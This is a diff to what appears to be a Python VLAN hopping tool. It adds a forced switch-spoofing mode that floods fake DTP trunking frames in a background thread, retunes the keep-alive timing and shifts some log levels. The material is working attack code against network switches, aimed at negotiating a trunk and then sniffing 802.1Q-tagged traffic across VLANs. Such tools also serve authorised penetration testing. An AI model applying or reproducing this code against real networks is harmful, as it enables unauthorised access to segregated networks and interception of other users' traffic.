@@ -274,7 +274,7 @@ def floodTrunkingRequests():
         Logger.dbg('SENT: DTP Trunk Keep-Alive:\n{}'.format(frame.summary()))
         send(frame, iface = config['interface'], verbose = False)
 
-        time.sleep(30)
+        time.sleep(config['timeout'] / 3)
 
 def engageDot1qSniffer():
     global dot1qSnifferStarted
@@ -335,6 +335,17 @@ def processDtps(dtps):
             attackEngaged = True
             time.sleep(5)
 
+    if config['force']:
+        Logger.ok('FORCED VLAN Hopping via Switch Spoofing.')
+        Logger.ok('Flooding with fake Access/Desirable DTP frames...\n')
+
+        t = threading.Thread(target = floodTrunkingRequests)
+        t.daemon = True
+        t.start()
+
+        attackEngaged = True
+        time.sleep(5)
+
     if attackEngaged:
         engageDot1qSniffer()
             
@@ -385,7 +396,7 @@ def addVlanIface(vlan):
         tempfiles.append(pidFile)
         tempfiles.append(dbFile)
 
-        Logger.info('So far so good, subinterface {} added.'.format(subif))
+        Logger.dbg('So far so good, subinterface {} added.'.format(subif))
 
         ret = False
         for attempt in range(3):
@@ -456,7 +467,7 @@ def sniffThread():
 
         if len(dtps) > 0 or config['force']:
             if len(dtps) > 0:
-                Logger.dbg('Got {} DTP frames.\n'.format(
+                Logger.info('Got {} DTP frames.\n'.format(
                     len(dtps)
                 ))
             else:
@@ -571,6 +582,9 @@ def parseOptions(argv):
     config['interface'] = args.interface
     config['commands'] = args.command
     config['exitcommands'] = args.exitcommand
+
+    if args.force:
+        config['timeout'] = 30
 
     return args
 
